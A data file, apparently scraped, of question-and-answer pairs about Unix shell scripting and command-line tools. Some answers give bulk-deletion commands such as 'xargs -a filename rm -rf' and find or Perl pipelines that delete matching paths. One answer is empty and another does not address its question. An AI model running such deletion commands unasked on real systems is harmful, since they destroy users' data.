    "How does the OPTIND variable work in the shell builtin getopts": "According to man getopts, OPTIND is the index of the next argument to be processed (starting index is 1). Hence,\nIn sh foo.sh -abc CCC Blank arg1 is -abc, so after a we are still parsing arg1 when next is b (a 1). Same is true when next is c, we are still in arg1 (b 1). When we are at c, since c needs an argument (CCC) the OPTIND is 3 (arg2 is CCC and we skip it).\nIn sh foo.sh -a -b -c CCC Blank, arg1 is a, arg2 is b, arg3 is c, and arg4 is CCC. So we get a 2, b 3, c 5.\nIn sh foo.sh -ab -c CCC Blank args are (1:-ab, 2: -c, 3: CCC and 4: Blank). So we get: a 1, b 2, c 4.\nIn sh foo.sh -a -bc CCC Blank args are (1: -a, 2: -bc, 3: CCC, 4: Blank) and we get a 2, b 2, c 4.",
    "How do you even give an (openFST-made) FST input? Where does the output go?": "One way is to create your machine that performs the transformation. A very simple example would be to upper case a string.\nM.wfst\n0 0 a A\n0 0 b B\n0 0 c C\n0\nThe accompanying symbols file contains a line for for each symbols of the alphabet. Note 0 is reserved for null (epsilon) transitions and has special meaning in many of the operations.\nM.syms\n<epsilon> 0\na 1\nb 2\nc 3\nA 4\nB 5\nC 6\nThen compile the machine\nfstcompile --isymbols=M.syms --osymbols=M.syms M.wfst > M.ofst\nFor an input string \"abc\" create a linear chain automata, this is a left-to-right chain with an arc for each character. This is an acceptor so we only need a column for the input symbols.\nI.wfst\n0 1 a\n1 2 b\n2 3 c\n3  \nCompile as an acceptor\nfstcompile --isymbols=M.syms --acceptor I.wfst > I.ofst\nThen compose the machines and print\nfstcompose I.ofst M.ofst | fstprint --isymbols=M.syms --osymbols=M.syms \nThis will give the output\n0   1   a   A\n1   2   b   B\n2   3   c   C\n3\nThe output of fstcompose is a lattice of all transductions of the input string. (In this case there is only one). If M.ofst is more complicated fstshortestpath can be used to extract n-strings using the flags --unique -nshortest=n. This output is again a transducer, you could either scrap the output of fstprint, or use C++ code and the OpenFst library to run depth first search to extract the strings.\nInserting fstproject --project_output will convert the output to an acceptor containing only the output labels.\nfstcompose I.ofst M.ofst | fstproject --project_output |  fstprint --isymbols=M.syms --osymbols=M.syms \nGives the following\n0  1  A  A\n1  2  B  B\n2  3  C  C\n3\nThis is an acceptor because the input and output labels are the same, the --acceptor options can be used to generate more succinct output.\n fstcompose I.ofst M.ofst | fstproject --project_output |  fstprint --isymbols=M.syms --acceptor",
    "Cygwin error: \"child_info_fork::abort: Loaded to different address:\"": "The thread is obsolete.\nrun /usr/bin/rebase-trigger, close all cygwin processes and run again setup-x86.exe. Also without installing anything will execute a rebase for you.\nYou can also specify the option full.\nAdditional note: The most likely cause of fork problems on 32 bit system are too many programs and libraries installed.\nfor example: /usr/x86_64-pc-cygwin/sys-root/usr/bin/cygz.dll\nbelongs to cygwin64-zlib a cross library for building cygwin64 programs from cygwin32. Do you really need it ? If not, as I suspect, remove all cywgin64 packages .",
    "Unix Bash script to embolden/underline/italicize specific text": "Basically, you want to do declare some variables with the styling code--something like this:\nunderline=`tput smul`\nnounderline=`tput rmul`\nbold=`tput bold`\nnormal=`tput sgr0`\nthen you can call these for use in your output using the variables, like this:\necho \"${bold}bold${normal} text stands out!\"\necho \"${underline}underlined${nounderline} text does, too.\"\nAs far as automating it to apply to all lines beginning with a specific character, you're better off just using the variables as shown above. Besides using this method just being easier, it's also cleaner and more usable. For example, when using this method you have the ability to style any number of words in a given output string differently, so as to emphasize a specific word, not the entire sentence (unless of course that's your goal).\nFor more information, you should check out http://tldp.org/HOWTO/Bash-Prompt-HOWTO/x405.html and/or man tput",
    "How to disable editing my history in bash": "I somehow manage to affect the original command, i.e. my edit replaces the original command back in history.\nRight. If you go back in your history and edit the line without pressing return to execute the command but instead moving to another history entry, you've just edited the history entry. If you then list your history, you will see a * on the line indicating that you edited it. I find this \"feature\" immensely frustrating. Others have provided good examples of how to reproduce this.\nMy goal is to avoid this, so any edit to a previous command always gets appended to history and never replaces the original.\nI too wanted to disable it. I found the solution via this answer over on unix.stackexchange.\nTo summarize, you need to enable the revert-all-at-newline readline setting which is off by default. If the setting is on then bash will revert any changes you made to your history when you execute the next command.\nTo enable this setting in your shell, you should add the following to your ~/.inputrc file and then restart your shell:\n$include /etc/inputrc\nset revert-all-at-newline on\nThe first line is needed because I guess that if you supply your own .inputrc file the default /etc/inputrc file is not included which is probably not what you want.",
    "What is the subprocess.Popen max length of the args parameter?": "If you're passing shell=False, then Cmd.exe does not come into play.\nOn windows, subprocess will use the CreateProcess function from Win32 API to create the new process. The documentation for this function states that the second argument (which is build by subprocess.list2cmdline) has a max length of 32,768 characters, including the Unicode terminating null character. If lpApplicationName is NULL, the module name portion of lpCommandLine is limited to MAX_PATH characters.\nGiven your example, I suggest providing a value for executable (args[0]) and using args for the first parameter. If my reading of the CreateProcess documentation and of the subprocess module source code is correct, this should solve your problem.\n[edit: removed the args[1:] bit after getting my hands on a windows machine and testing]",
    "Use Bash variable within SLURM sbatch script": "This won't work. What happens when you run\nsbatch myscript.sh\nis that slurm parses the script for those special #SBATCH lines, generates a job record, stores the batch script somewhere. The batch script is executed only later when the job runs.\nSo you need to structure you workflow in a slightly different way, and first calculate the number of procs you need before submitting the job. Note that you can use something like\nsbatch -n $numProcs myscript.sh\n, you don't need to autogenerate the script (also, mpirun should be able to get the number of procs in your allocation automatically, no need to use \"-np\").",
    "How to make virtualenvwrapper work in fish shell?": "There are a number of alternatives, but the best approach I've found is https://github.com/adambrenecki/virtualfish\nThat will give you a .fish wrapper around virtualenv with all the virtualenvwrapper commands you are used to.",
    "Getting Android SDK version of a device from command line": "",
    "How to remove dir background in `ls -color` output [closed]": "Quick solution:\nEnter these two commands in the Bash command line:\ndircolors -p | sed 's/;42/;01/' > ~/.dircolors\nsource ~/.bashrc\nExplanation:\nThere is a program dircolors intended to set up the config for ls. The default ~/.bashrc script loads the config with these lines:\n# enable color support of ls and also add handy aliases\nif [ -x /usr/bin/dircolors ]; then\n    test -r ~/.dircolors && eval \"$(dircolors -b ~/.dircolors)\" || eval \"$(dircolors -b)\"\nBecause by default the file ~/.dircolors does not actually exist the script uses the built-in Bash config (eval \"$(dircolors -b)\").\nTo remove green background for o+w ('writable by others' permission marked by last 'w' in drwxrwxrwx notation in ls) directories you need to create this file basing on the current (built-in) config. In the command line type the following:\ndircolors -p > ~/.dircolors\ndircolor -p prints the current config and > redirects the output to the given file.\nNow open the file in an editor and find the following line:\nOTHER_WRITABLE 34;42 # dir that is other-writable (o+w) and not sticky\nchange the number 42 (denoting green background) to 01 (no background) and save changes. Alternatively you can do it with sed program and its substitution feature ('s/PATTERN/NEW_STRING/' syntax) from the command line directly:\nsed -i 's/;42/;01/' ~/.dircolors\nAbove 2 things can be achieved by a single command using a pipe '|':\ndircolors -p | sed 's/;42/;01/' > ~/.dircolors\nTo get the change to take the effect (without restarting the shell), type:\nsource ~/.bashrc",
    "Shell: list directories ordered by file count (including in subdirectories)": "I use the following command\nfind . -xdev -type f | cut -d \"/\" -f 2 | sort | uniq -c | sort -n\nWhich produces something like:\n[root@ip-***-***-***-*** /]# find . -xdev -type f | cut -d \"/\" -f 2 | sort | uniq -c | sort -n\n      1 .autofsck\n      1 stat-nginx-access\n      1 stat-nginx-error\n      2 tmp\n     14 boot\n     88 bin\n    163 sbin\n    291 lib64\n    597 etc\n    841 opt\n   1169 root\n   2900 lib\n   7634 home\n  42479 usr\n  80964 var",
    "Emacs shell scripts - how to put initial options into the script?": "Many unix variants only allow a single argument to the program on the shebang line. Sad, but true. If you use #!/usr/bin/env emacs so as not to depend on the location of the emacs executable, you can't pass an argument at all.\nChaining scripts is a possibility on some systems, but that too is not supported everywhere.\nYou can go the time-honored route of writing a polyglot script: a script that is both a shell script and an Emacs Lisp script (like Perl's if $running_under_some_shell, for example). It sure looks hackish, but it works.\nElisp comments begin with ;, which in the shell separates two commands. So we can use a ; followed by a shell instruction to switch over to Emacs, with the actual Lisp code beginning on the next line. Most shells don't like an empty command though, so we need to find something that both the shell and Emacs treat as a no-op, to put before the ;. The shell no-op command is :; you can write it \":\" as far as the shell is concerned, and Emacs parses that as a constant at top level which is also a no-op.\n#! /bin/sh\n\":\"; exec emacs --no-site-file --script \"$0\" -- \"$@\" # -*-emacs-lisp-*-\n(print (+ 2 2))",
    "check if argument is a valid date in bash shell": "You can check with date -d \"datestring\"\nSo date -d \"12/31/2012\" is valid, but using hyphens, e.g. date -d \"12-31-2012\", is not valid for date.\nYou can also use words: date -d 'yesterday' or date -d '1 week ago' are both valid.",
    "List all directories recursively in a tree format": "Try doing this (not exactly the same output, but very close) :\nfind ./ -type d -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'\nFrom http://mlsamuelson.com/content/tree-approximation-using-find-and-sed\nwith\nawk\nfind . -type d -print 2>/dev/null|awk '!/\\.$/ {for (i=1;i<NF;i++){d=length($i);if ( d < 5  && i != 1 )d=5;printf(\"%\"d\"s\",\"|\")}print \"---\"$NF}'  FS='/'\nSee http://www.unix.com/shell-programming-scripting/50806-directory-tree.html",
    "\"__rvm_do_with_env_before\" and \"__rvm_after_cd\" when doing \"cd\"": "it should be enough to reopen your terminal, in rare cases relogin/restart is needed.",
    "How to generate targets in a Makefile by iterating over a list?": "If you're using GNU make, you can generate arbitrary targets at run-time:\nLIST = 0 1 2 3 4 5\ndefine make-rambo-target\n  rambo$1:\n         sh rambo_script$1.sh\n  all:: rambo$1\nendef\n\n$(foreach element,$(LIST),$(eval $(call make-rambo-target,$(element))))",
    "How to handle shell getopts with parameter containing blank spaces": "a trap for young players (ie me!)\nbeware a line like this:\nmain $@\nwhat you really need is:\nmain \"$@\"\notherwise getopts will mince up your options into little pieces\nhttp://www.unix.com/shell-programming-scripting/70630-getopts-list-argument.html",
    "Rename file command in Unix with timestamp": "You can use\nmv test.dat test_$(date +%d-%m-%Y).dat\nIf you want to know how you can control your output have a look at the date Manpages..\nman date ",
    "Changing a hostname permanently in Ubuntu": "The hostnamectl combines setting the hostname via the hostname command and editing /etc/hostname. Unfortunately, editing /etc/hosts still has to be done separately.\nhostnamectl set-hostname <new-hostname>",
    "Using sed to insert text at the beginning of each line": "sed 's/^/rm -rf /' filename\nEDIT\nXargs would be simpler way to delete all of the files listed in another file\nxargs -a filename rm -rf",
    "Pass bash argument to python script": "In this case the trick is to pass however many arguments you have, including the case where there are none, and to preserve any grouping that existed on the original command line.\nSo, you want these three cases to work:\nscript.sh                       # no args\nscript.sh how now               # some number\nscript.sh \"how now\" \"brown cow\" # args that need to stay quoted\nThere isn't really a natural way to do this because the shell is a macro language, so they've added some magic syntax that will just DTRT.\n#!/bin/sh\n\npython script.py \"$@\"",
    "How to print ASCII value of a character using basic awk only": "Using only basic awk (not even gawk, so the below should work on all BSD and Linux variants):\n$ echo a | awk 'BEGIN{for(n=0;n<256;n++)ord[sprintf(\"%c\",n)]=n}{print ord[$1]}'\n97\nHere's the opposite direction (for completeness):\n$ echo 97 | awk 'BEGIN{for(n=0;n<256;n++)chr[n]=sprintf(\"%c\",n)}{print chr[$1]}'\na\nBasic premise is to use a lookup table.",
    "Signal Handling in C": "When dealing with POSIX signals, you have two means at your disposal. First, the easy (but discouraged) way, signal(). Second, the more elegant, current but complex way, sigaction(). Please use sigaction() unless you find that it isn't available on some platform that you need to work on.\nThis chapter of the glibc manual explains differences between the two and gives good example code on how to use both. It also lists the signals that can be handled, recommends how they should be handled and goes more in depth on how to tell how any given signal is (or is not) currently being handled. That's way more code than I'd want to paste into an answer here, hence the links.\nIt really is worth the hour or two it would take you to read the links and work through the examples. Signal handling (especially in programs that daemonize) is extremely important. A good program should handle all fatal signals that can be handled (i.e. SIGHUP) and explicitly ignore signals that it might not be using (i.e. SIGUSR1 / SIGUSR2).\nIt also won't hurt to study the difference between normal and real time signals, at least up to the understanding of how the kernel merges the prior and not the latter.\nOnce you work through it, you'll probably feel inclined to write up an easy to modify set of functions to handle your signals and re-use that code over and over again.\nSorry for not giving a quick and dirty code snippet to show you how to solve your immediate need, but this isn't a quick and dirty topic :)",
    "Limit top command to only display top X processes on command line [closed]": "I use a trick, specially for batch mode. I pipeline the exit to grep, with option \"-A\", to show N lines after match.\nAs in the first line of top there is something like: \"load average\", I grep that, for instance:\n$ top -d 5 -b|grep \"load average\" -A 15\ntop - 09:42:34 up 38 min,  1 user,  load average: 0.22, 0.39, 0.53\nTasks: 294 total,   2 running, 291 sleeping,   0 stopped,   1 zombie\n%Cpu(s):  3.5 us,  0.9 sy,  0.0 ni, 94.6 id,  0.5 wa,  0.3 hi,  0.1 si,  0.0 st\nKiB Mem :  8065144 total,  2213800 free,  2733524 used,  3117820 buff/cache\nKiB Swap: 24575996 total, 24575996 free,        0 used.  4613128 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND\n 2744 lrojas    20   0 3376820 752000 116588 R  20.2  9.3   9:30.01 firefox\n 1869 lrojas     9 -11  566164  18336  14300 S   5.2  0.2   2:35.78 pulseaudio\n 2401 lrojas    20   0  740092 200456  87256 S   2.4  2.5   0:57.29 skype\n 2402 lrojas    20   0  617872 172924  76172 S   2.2  2.1   0:57.17 skype\n 1333 root      20   0  459028  60992  48024 S   1.6  0.8   0:36.14 Xorg\n 1838 lrojas    20   0 2103336 184468  64724 S   1.4  2.3   0:56.85 gnome-shell\n 2359 lrojas    20   0  741212  35068  24620 S   1.4  0.4   0:06.83 gnome-terminal-\n 2404 lrojas    20   0 1867556 229912  83988 S   0.8  2.9   0:19.63 thunderbird\n 1249 apache    20   0  461436  10196   3404 S   0.4  0.1   0:00.57 httpd\nThis way it will continue in batch mode, always showing only the first N lines of output.\nCompletely standard solution, for any version of top.",
    "One liner to set environment variable if doesn't exist, else append": "A little improvement on Michael Burr's answer. This works with set -u (set -o nounset) as well:\nPATH=${PATH:+$PATH:}/path/to/bin",
    "How do I get bash on OS X Lion to ignore .DS_Store files during tab completion?": "Add this line to your .bash_profile file:\nexport FIGNORE=DS_Store",
    "Why does this sed command to match number not work?": "+ must be backslashed to get its special meaning.\necho \"12 cats\" | sed 's/[0-9]\\+/Number/g'",
    "RTMP: Is there such a linux command line tool?": "One of the following should do, if you have mplayer or vlc compiled with RTMP access.\nmplayer -dumpstream rtmp://live.site.com/loc/45/std_fc74a6b7f79c70a5f60.mp3\nThis will generate a ./stream.dump.\nvlc -I dummy rtmp://live.site.com/loc/45/std_fc74a6b7f79c70a5f60.mp3 \\\n    --sout file/ts:output.mpg vlc://quit\nThis will generate a ./output.mpg. You'll have to demux it to extract just the audio stream out.",
    "Echo to both stdout and stderr": "This should do it\n echo \"foo\" | tee /dev/stderr ",
    "BASH: Writing a Script to Recursively Travel a Directory of N Levels": "Several problems with the script. It should be like this:\n#!/bin/bash\n\n#script to recursively travel a dir of n levels\n\nfunction traverse() {\nfor file in \"$1\"/*\ndo\n    if [ ! -d \"${file}\" ] ; then\n        echo \"${file} is a file\"\n    else\n        echo \"entering recursion with: ${file}\"\n        traverse \"${file}\"\n    fi\ndone\n}\n\nfunction main() {\n    traverse \"$1\"\n}\n\nmain \"$1\"\nHowever, the correct way to recursively traverse a directory is by using the find command:\nfind . -print0 | while IFS= read -r -d '' file\ndo \n    echo \"$file\"\ndone",
    "best way to programmatically check for a failed scp in a shell script": "Use $? to access the return value of the last command. Check the man page for scp to verify, but I think a return value of zero means success. A non-zero value means some kind of failure.",
    "Prompt user to select a directory with a bash script and read result": "Unless your formatting requirements are very strict, you can probably just use bash\u2019s select construct.\nThe following code will present a menu of all the directories in the current directory and then chdir to the selected one:\n#!/bin/bash\nprintf \"Please select folder:\\n\"\nselect d in */; do test -n \"$d\" && break; echo \">>> Invalid Selection\"; done\ncd \"$d\" && pwd",
    "How to pass environment variable to mongo script": "This worked for me:\nmongo --eval \"var my_var = '$MY_VAR'\" my_script.js\nLeave out the <. mongo will process any remaining arguments on the command line as files to be executed/interpreted, but apparently combining the shell input redirect with --eval causes the javascript namespace to be reset.\nI assume but cannot confirm that this is because filenames passed as arguments are processed via the load() mechanism, which according to https://docs.mongodb.com/v3.2/reference/method/load/, behaves as follows:\nAfter executing a file with load(), you may reference any functions or variables defined the file from the mongo shell environment.",
    "How to include nohup inside a bash script?": "Try putting this at the beginning of your script:\n#!/bin/bash\n\ncase \"$1\" in\n    -d|--daemon)\n        $0 < /dev/null &> /dev/null & disown\n        exit 0\n        ;;\n    *)\n        ;;\nesac\n\n# do stuff here\nIf you now start your script with --daemon as an argument, it will restart itself detached from your current shell.\nYou can still run your script \"in the foreground\" by starting it without this option.",
    "How do I echo a sum of a variable and a number?": "No need for expr, POSIX shell allows $(( )) for arithmetic evaluation:\necho $((x+1))\nSee \u00a72.6.4",
    "Unexpected Operator error in shell script": "if [ \"$req\" = 1 ]\nor even better\nif [ \"$req\" -eq 1 ]\nSee the syntax and operators in man test.",
    "Go to line in Atom editor from command line": "Atom commands are similar to Visual Studio and sublime text in this scenario. First press the Ctrl+G in your keyboard then you will redirect to command line in the Atom editor, then type line number to navigate that line Number.",
    "execute file from defined directory with Runtime.getRuntime().exec": "It should be possible to call the executable with a specific working directory using Runtime.exec(String command, String[] envp, File dir)\nas follows:\nProcess process2=Runtime.getRuntime().exec(\"/data/data/my-package/files/myfile\",\n        null, new File(\"/data/data/my-package/files\"));\nmaybe without the full path to myfile\nProcess process2=Runtime.getRuntime().exec(\"myfile\",\n        null, new File(\"/data/data/my-package/files\"));\nContext#getFilesDir() instead of hardcoding the path should work too and is safer / cleaner than specifying the path yourself since it is not guaranteed that /data/data/.. is always the correct path for all devices.\nProcess process2=Runtime.getRuntime().exec(\"myfile\",\n        null, getFilesDir()));\nThe problem with cd somewhere is that the directory is changed for a different Process so the second call to exec in a new Process does not see the change.",
    "syntax of for loop in linux shell scripting": "You probably run it with sh, not bash. Try bash test1.sh, or ./test1.sh if it's executable, but not sh test1.sh.",
    "How can I do float comparison in Bash?": "Bash itself can't use float. In this case maybe you can multiply by 10 or 100 (etc.) and get integer value which you can compare. Or, you can use bc comparison and return value:\necho \"10.2>10.1\" | bc",
    "Shell script: Get name of last file in a folder by alphabetical order": "ls -1 | tail -n 1\nIf you want to assign this to a variable, use $(...) or backticks.\nFILE=`ls -1 | tail -n 1`\nFILE=$(ls -1 | tail -n 1)",
    "Re run previous command with different arguments": "!:0 should do the trick. From the zsh documentation:\n   Word Designators\n       A word designator indicates which word or words of a given command line\n       are to be included in a history reference.  A `:' usually separates the\n       event specification from the word designator.  It may be  omitted  only\n       if  the  word designator begins with a `^', `$', `*', `-' or `%'.  Word\n       designators include:\n\n       0      The first input word (command).\n       n      The nth argument.\n       ^      The first argument.  That is, 1.\n       $      The last argument.\n       %      The word matched by (the most recent) ?str search.\n       x-y    A range of words; x defaults to 0.\n       *      All the arguments, or a null value if there are none.\n       x*     Abbreviates `x-$'.\n       x-     Like `x*' but omitting word $.\n(It works with bash, too.) There\u2019s also !-1 if you find that more convenient to type.",
    "Terminal color in Ruby": "I prefer the Rainbow gem since it also supports Windows if the win32console gem has been installed.\nYou can use it like this:\nputs \"some \" + \"red\".color(:red) + \" and \" + \"blue on yellow\".color(:blue).background(:yellow)",
    "grep command to add end line after every match [duplicate]": "You want the following option:\n--group-separator=SEP\nUse SEP as a group separator. By default SEP is double hyphen (--).\nDemo:\n$ cat file\nbefore\nexception 1\nafter\nfoo\nbar\nbefore\nexception 2\nafter\n\n$ grep -A 1 -B 1 --group-separator======================== exception file \nbefore\nexception 1\nafter\n=======================\nbefore\nexception 2\nafter",
    "How to get the exit status set in a shell script in Python": "import subprocess\n\nresult = subprocess.Popen(\"./compile_cmd.sh\")\ntext = result.communicate()[0]\nreturn_code = result.returncode\nTaken from here: How to get exit code when using Python subprocess communicate method?",
    "find and delete files with non-ascii names": "Non-ASCII characters\nASCII character codes range from 0x00 to 0x7F in hex. Therefore, any character with a code greater than 0x7F is a non-ASCII character. This includes the bulk of the characters in UTF-8 (ASCII codes are essentially a subset of UTF-8). For example, the Japanese character\n\u3042\nis encoded in hex in UTF-8 as\nE3 81 82\nUTF-8 has been the default character encoding on, among others, Red Hat Linux since version 8.0 (2002), SuSE Linux since version 9.1 (2004), and Ubuntu Linux since version 5.04 (2005).\nASCII control characters\nOut of the ASCII codes, 0x00 through 0x1F and 0x7F represent control characters such as ESC (0x1B). These control characters were not originally intended to be printable even though some of them, like the line feed character 0x0A, can be interpreted and displayed.\nOn my system, ls displays all control characters as ? by default, unless I pass the --show-control-chars option. I'm guessing that the files you want to delete contain ASCII control characters, as opposed to non-ASCII characters. This is an important distinction: if you delete filenames containing non-ASCII characters, you may blow away legitimate files that just happen to be named in another language.\nRegular expressions for character codes\nPOSIX\nPOSIX provides a very handy collection of character classes for dealing with these types of characters (thanks to bashophil for pointing this out):\n[:cntrl:] Control characters\n[:graph:] Graphic printable characters (same as [:print:] minus the space character)\n[:print:] Printable characters (same as [:graph:] plus the space character)\nPCRE\nPerl Compatible Regular Expressions allow hexadecimal character codes using the syntax\n\\x00\nFor example, a PCRE regex for the Japanese character \u3042 would be\n\\xE3\\x81\\x82\nIn addition to the POSIX character classes listed above, PCRE also provides the [:ascii:] character class, which is a convenient shorthand for [\\x00-\\x7F].\nGNU's version of grep supports PCRE using the -P flag, but BSD grep (on Mac OS X, for example) does not. Neither GNU nor BSD find supports PCRE regexes.\nFinding the files\nGNU find supports POSIX regexes (thanks to iscfrc for pointing out the pure find solution to avoid spawning additional processes). The following command will list all filenames (but not directory names) below the current directory that contain non-printable control characters:\nfind -type f -regextype posix-basic -regex '^.*/[^/]*[[:cntrl:]][^/]*$'\nThe regex is a little complicated because the -regex option has to match the entire file path, not just the filename, and because I'm assuming that we don't want to blow away files with normal names simply because they are inside directories with names containing control characters.\nTo delete the matching files, simply pass the -delete option to find, after all other options (this is critical; passing -delete as the first option will blow away everything in your current directory):\nfind -type f -regextype posix-basic -regex '^.*/[^/]*[[:cntrl:]][^/]*$' -delete\nI highly recommend running the command without the -delete first, so you can see what will be deleted before it's too late.\nIf you also pass the -print option, you can see what is being deleted as the command runs:\nfind -type f -regextype posix-basic -regex '^.*/[^/]*[[:cntrl:]][^/]*$' -print -delete\nTo blow away any paths (files or directories) that contain control characters, the regex can be simplified and you can drop the -type option:\nfind -regextype posix-basic -regex '.*[[:cntrl:]].*' -print -delete\nWith this command, if a directory name contains control characters, even if none of the filenames inside the directory do, they will all be deleted.\nUpdate: Finding both non-ASCII and control characters\nIt looks like your files contain both non-ASCII characters and ASCII control characters. As it turns out, [:ascii:] is not a POSIX character class, but it is provided by PCRE. I couldn't find a POSIX regex to do this, so it's Perl to the rescue. We'll still use find to traverse our directory tree, but we'll pass the results to Perl for processing.\nTo make sure we can handle filenames containing newlines (which seems likely in this case), we need to use the -print0 argument to find (supported on both GNU and BSD versions); this separates records with a null character (0x00) instead of a newline, since the null character is the only character that can't be in a valid filename on Linux. We need to pass the corresponding flag -0 to our Perl code so it knows how records are separated. The following command will print every path inside the current directory, recursively:\nfind . -print0 | perl -n0e 'print $_, \"\\n\"'\nNote that this command only spawns a single instance of the Perl interpreter, which is good for performance. The starting path argument (in this case, . for CWD) is optional in GNU find but is required in BSD find on Mac OS X, so I've included it for the sake of portability.\nNow for our regex. Here is a PCRE regex matching names that contain either non-ASCII or non-printable (i.e. control) characters (or both):\n[[:^ascii:][:cntrl:]]\nThe following command will print all paths (directories or files) in the current directory that match this regex:\nfind . -print0 | perl -n0e 'chomp; print $_, \"\\n\" if /[[:^ascii:][:cntrl:]]/'\nThe chomp is necessary because it strips off the trailing null character from each path, which would otherwise match our regex. To delete the matching files and directories, we can use the following:\nfind . -print0 | perl -MFile::Path=remove_tree -n0e 'chomp; remove_tree($_, {verbose=>1}) if /[[:^ascii:][:cntrl:]]/'\nThis will also print out what is being deleted as the command runs (although control characters are interpreted so the output will not quite match the output of ls).",
    "How to update a output field in terminal without output a new line? [duplicate]": "The trick used for this is to return to the first position in the current line instead of progressing to the next line.\nThis is done by writing the \\r character (carriage return) to the terminal/stdout.",
    "How to detect the current directory in which I run my shell script?": "what shell? What operating system?\nFor starters try\nman pwd\n$PWD",
    "Move the cursor in a C program": "Using termios and console-codes (VT100 compatible - not portable):\n#include <stdio.h>\n#include <string.h>\n#include <termios.h>\n#include <unistd.h>\n\n#define cursorforward(x) printf(\"\\033[%dC\", (x))\n#define cursorbackward(x) printf(\"\\033[%dD\", (x))\n\n#define KEY_ESCAPE  0x001b\n#define KEY_ENTER   0x000a\n#define KEY_UP      0x0105\n#define KEY_DOWN    0x0106\n#define KEY_LEFT    0x0107\n#define KEY_RIGHT   0x0108\n\nstatic struct termios term, oterm;\n\nstatic int getch(void);\nstatic int kbhit(void);\nstatic int kbesc(void);\nstatic int kbget(void);\n\nstatic int getch(void)\n{\n    int c = 0;\n\n    tcgetattr(0, &oterm);\n    memcpy(&term, &oterm, sizeof(term));\n    term.c_lflag &= ~(ICANON | ECHO);\n    term.c_cc[VMIN] = 1;\n    term.c_cc[VTIME] = 0;\n    tcsetattr(0, TCSANOW, &term);\n    c = getchar();\n    tcsetattr(0, TCSANOW, &oterm);\n    return c;\n}\n\nstatic int kbhit(void)\n{\n    int c = 0;\n\n    tcgetattr(0, &oterm);\n    memcpy(&term, &oterm, sizeof(term));\n    term.c_lflag &= ~(ICANON | ECHO);\n    term.c_cc[VMIN] = 0;\n    term.c_cc[VTIME] = 1;\n    tcsetattr(0, TCSANOW, &term);\n    c = getchar();\n    tcsetattr(0, TCSANOW, &oterm);\n    if (c != -1) ungetc(c, stdin);\n    return ((c != -1) ? 1 : 0);\n}\n\nstatic int kbesc(void)\n{\n    int c;\n\n    if (!kbhit()) return KEY_ESCAPE;\n    c = getch();\n    if (c == '[') {\n        switch (getch()) {\n            case 'A':\n                c = KEY_UP;\n                break;\n            case 'B':\n                c = KEY_DOWN;\n                break;\n            case 'C':\n                c = KEY_LEFT;\n                break;\n            case 'D':\n                c = KEY_RIGHT;\n                break;\n            default:\n                c = 0;\n                break;\n        }\n    } else {\n        c = 0;\n    }\n    if (c == 0) while (kbhit()) getch();\n    return c;\n}\n\nstatic int kbget(void)\n{\n    int c;\n\n    c = getch();\n    return (c == KEY_ESCAPE) ? kbesc() : c;\n}\n\nint main(void)\n{\n    int c;\n\n    while (1) {\n        c = kbget();\n        if (c == KEY_ENTER || c == KEY_ESCAPE || c == KEY_UP || c == KEY_DOWN) {\n            break;\n        } else\n        if (c == KEY_RIGHT) {\n            cursorbackward(1);\n        } else\n        if (c == KEY_LEFT) {\n            cursorforward(1);\n        } else {\n            putchar(c);\n        }\n    }\n    printf(\"\\n\");\n    return 0;\n}",
    "Grep across multiple files in Hadoop Filesystem": "This is a hadoop \"filesystem\", not a POSIX one, so try this:\nhadoop fs -ls /apps/hdmi-technology/b_dps/real-time | awk '{print $8}' | \\\nwhile read f\ndo\n  hadoop fs -cat $f | grep -q bcd4bc3e1380a56108f486a4fffbc8dc && echo $f\ndone\nThis should work, but it is serial and so may be slow. If your cluster can take the heat, we can parallelize:\nhadoop fs -ls /apps/hdmi-technology/b_dps/real-time | awk '{print $8}' | \\\n  xargs -n 1 -I ^ -P 10 bash -c \\\n  \"hadoop fs -cat ^ | grep -q bcd4bc3e1380a56108f486a4fffbc8dc && echo ^\"\nNotice the -P 10 option to xargs: this is how many files we will download and search in parallel. Start low and increase the number until you saturate disk I/O or network bandwidth, whatever is relevant in your configuration.\nEDIT: Given that you're on SunOS (which is slightly brain-dead) try this:\nhadoop fs -ls /apps/hdmi-technology/b_dps/real-time | awk '{print $8}' | while read f; do hadoop fs -cat $f | grep bcd4bc3e1380a56108f486a4fffbc8dc >/dev/null && echo $f; done",
    "How to avoid race condition when using a lock-file to avoid two instances of a script running simultaneously?": "Yes, there is indeed a race condition in the sample script. You can use bash's noclobber option in order to get a failure in case of a race, when a different script sneaks in between the -f test and the touch.\nThe following is a sample code-snippet (inspired by this article) that illustrates the mechanism:\nif (set -o noclobber; echo \"$$\" > \"$lockfile\") 2> /dev/null; \nthen\n   # This will cause the lock-file to be deleted in case of a\n   # premature exit.\n   trap 'rm -f \"$lockfile\"; exit $?' INT TERM EXIT\n\n   # Critical Section: Here you'd place the code/commands you want\n   # to be protected (i.e., not run in multiple processes at once).\n\n   rm -f \"$lockfile\"\n   trap - INT TERM EXIT\nelse\n   echo \"Failed to acquire lock-file: $lockfile.\" \n   echo \"Held by process $(cat $lockfile).\"\nfi",
    "Is Bash an interpreted language? [closed]": "Bash is definitely interpreted; I don't think there's any reasonable question about that.\nThere might possibly be some controversy over whether it's a language. It's designed primarily for interactive use, executing commands provided by the operating system. For a lot of that particular kind of usage, if you're just typing commands like\necho hello\nor\ncp foo.txt bar.txt\nit's easy to think that it's \"just\" for executing simple commands. In that sense, it's quite different from interpreted languages like Perl and Python which, though they can be used interactively, are mainly used for writing scripts (interpreted programs).\nOne consequence of this emphasis is that its design is optimized for interactive use. Strings don't require quotation marks, most commands are executed immediately after they're entered, most things you do with it will invoke external programs rather than built-in features, and so forth.\nBut as we know, it's also possible to write scripts using bash, and bash has a lot of features, particularly flow control constructs, that are primarily for use in scripts (though they can also be used on the command line).\nAnother distinction between bash and many scripting languages is that a bash script is read, parsed, and executed in order. A syntax error in the middle of a bash script won't be detected until execution reaches it. A Perl or Python script, by contrast, is parsed completely before execution begins. (Things like eval can change that, but the general idea is valid.) This is a significant difference, but it doesn't mark a sharp dividing line. If anything it makes Perl and Python more similar to compiled languages.\nBottom line: Yes, bash is an interpreted language. Or, perhaps more precisely, bash is an interpreter for an interpreted language. (The name \"bash\" usually refers to the shell/interpreter rather than to the language that it interprets.) It has some significant differences from other interpreted languages that were designed from the start for scripting, but those differences aren't enough to remove it from the category of \"interpreted languages\".",
